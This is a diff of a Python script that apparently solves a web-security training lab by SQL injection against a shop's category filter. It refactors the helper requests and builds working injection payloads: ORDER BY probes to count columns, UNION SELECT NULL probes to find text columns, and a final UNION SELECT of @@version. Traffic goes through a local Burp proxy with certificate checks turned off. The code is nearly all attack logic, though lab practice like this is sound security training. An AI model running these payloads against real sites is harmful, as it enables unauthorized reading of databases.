@@ -6,12 +6,7 @@ from urllib.parse import urljoin
 
 import requests
 from bs4 import BeautifulSoup
-
-REQUEST_TIMEOUT = (2, 5)
-FILTER_ENDPOINT = "filter"
-FILTER_CATEGORY = ""
-MAX_COL_TO_TEST = 10
-BURP_PROXIES = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
+from requests import Response
 
 warnings.filterwarnings("ignore", message="Unverified HTTPS")
 
@@ -27,74 +22,86 @@ class LabExploit:
             "http": "http://127.0.0.1:8080",
             "https": "http://127.0.0.1:8080",
         }
-        self.timeout = (2, 5)
+        self.category = "Gifts"
 
-    def send_request(
+    def _send_request(
         self, endpoint: str, params: Optional[dict] = None, method: str = "GET"
-    ) -> Optional[requests.Response]:
-        url = urljoin(self.base_url, endpoint)
-
+    ) -> Optional[Response]:
+        """
+        Internal helper, returns Response or None
+        Used for discovery loops where non 200 status code are expected.
+        """
+        target_url = urljoin(self.base_url, endpoint)
         try:
             return self.session.request(
                 method=method,
-                url=url,
+                url=target_url,
                 params=params,
-                timeout=self.timeout,
+                timeout=(2, 5),
                 allow_redirects=True,
                 proxies=self.proxies,
                 verify=False,
             )
-        except requests.RequestException as e:
-            print(f"[-] Connection error: {e}")
+        except requests.RequestException:
             return None
+
+    def _validated_request(
+        self,
+        endpoint: str,
+        params: Optional[dict] = None,
+        method: str = "GET",
+        stage: str = "unknown",
+    ) -> Response:
+        """
+        Internal helper, returns Response
+        Used in steps which MUST succeed (200 OK) to continue.
+        """
+        res = self._send_request(endpoint, params, method)
+        if res is None:
+            print(f"[-] Stage [{stage}]: Connection error")
+            sys.exit(1)
+        elif res.status_code != 200:
+            print(f"[-] Stage [{stage}]: Received HTTP {res.status_code}")
+            print(f"[-] Failed payload context: {params}")
+            sys.exit(1)
+        return res
 
     def is_alive(self) -> bool:
         """Checks if the lab URL is alive"""
-        print("[*] Phase 1: Checking if URL is alive...")
-        res = self.send_request("")
-
-        if res is not None and res.status_code == 200:
-            if "academyLabHeader" in res.text:
-                return True
-
-        return False
+        print("[*] Phase 1: Checking if lab is active...")
+        res = self._validated_request("")
+        return "academyLabBanner" in res.text
 
     def harvest_category(self) -> Optional[str]:
         """Dynamically identifies a valid category to anchor injection."""
         print("[*] Phase 2: Harvesting valid filter categories...")
-        res = self.send_request("")
-        if not res:
-            return None
-
-        soup = BeautifulSoup(res.text, "html.parser")
+        res = self._validated_request("")
         categories = []
-
+        soup = BeautifulSoup(res.text, "html.parser")
         for tag in soup.find_all("a", class_="filter-category"):
             name = tag.get_text(strip=True)
             if "All" not in name:
                 categories.append(name)
-
         return min(categories, key=len) if categories else None
 
-    def find_column_count(self, category: str) -> int:
+    def get_table_width(self) -> int:
         print("[*] Phase 3: Determining column count...")
-
         for i in range(1, 11):
-            payload = f"{category}' ORDER BY {i} -- "
-            res = self.send_request("filter", params={"category": payload})
+            payload = f"{self.category}' ORDER BY {i} -- "
+            res = self._send_request("filter", params={"category": payload})
             if res is not None and res.status_code != 200:
                 return i - 1
         return 0
 
-    def find_string_column(self, category: str, col_count: int) -> List[int]:
+    def map_string_indices(self, col_count: int) -> List[int]:
         print("[*] Phase 4: Mapping string-compatible columns...")
         str_indices = []
-        marker = "asif"
+        marker = "asif-probe"
         for i in range(col_count):
             cols = ["NULL"] * col_count
             cols[i] = f"'{marker}'"
-            paylaod = f"{category}' UNION SELECT {','.join(cols)} -- "
-            res = self.send_request("filter", params={"category": paylaod})
+            paylaod = f"{self.category}' UNION SELECT {','.join(cols)} -- "
+            res = self._send_request("filter", params={"category": paylaod})
             if res and marker in res.text:
                 str_indices.append(i)
         return str_indices
@@ -110,16 +117,17 @@ class LabExploit:
         if not category:
             print("[-] Could not find a valid category.")
             return
+        self.category = category
         print(f"[+] Target category identified: {category}.")
 
         # Determine column count
-        col_count = self.find_column_count(category)
+        col_count = self.get_table_width()
         if col_count == 0:
             return
         print(f"[+] Column count: {col_count}.")
 
         # Map string-compatible column
-        col_indices = self.find_string_column(category, col_count)
+        col_indices = self.map_string_indices(col_count)
         if not col_indices:
             return
 
@@ -127,10 +135,10 @@ class LabExploit:
         cols = ["NULL"] * col_count
         cols[col_indices[0]] = "@@version"
         payload = f"{category}' UNION SELECT {','.join(cols)} -- "
-        self.send_request("filter", params={"category": payload})
+        self._send_request("filter", params={"category": payload})
 
         print("[*] Phase 6: Verifying lab status...")
-        res = self.send_request("")
+        res = self._send_request("")
 
         if res and "Congratulation" in res.text:
             print("[!] SUCCESS: Lab solved and verfied via session state.")
